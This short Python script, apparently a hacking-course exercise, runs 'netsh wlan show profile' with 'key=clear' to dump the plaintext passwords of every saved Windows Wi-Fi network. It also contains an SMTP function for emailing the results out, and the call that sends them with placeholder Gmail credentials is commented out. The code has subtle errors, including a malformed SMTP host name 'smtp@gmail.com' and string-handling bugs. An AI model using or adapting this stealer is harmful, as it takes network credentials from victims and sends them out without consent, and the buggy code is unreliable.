#!/usr/bin/env python

import subprocess, smtplib, re


def send_email(email, password, message):
    # google allow others to user there smtp server
    # send email
    server = smtplib.SMTP("smtp@gmail.com", 587)       # address for google's server and port
    # initiate tls connection
    server.starttls()
    # login to email
    server.login(email, password)
    server.sendmail(email, email, message)     # from to content
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)		#non-capturing group
# print(network_names_list)


result = ""
for network_name in network_names_list:
	print(network_name)
	command = "netsh wlan show profile " + network_name + " key=clear"
	try:
		current_result = subprocess.check_output(command, shell=True)
		result = result + current_result
	except subprocess.CalledProcessError:
		print("error")

	print(current_result)
	# result = result + current_result

# print(result)
# send_email("test@gmail.com", "testettetetet", result)

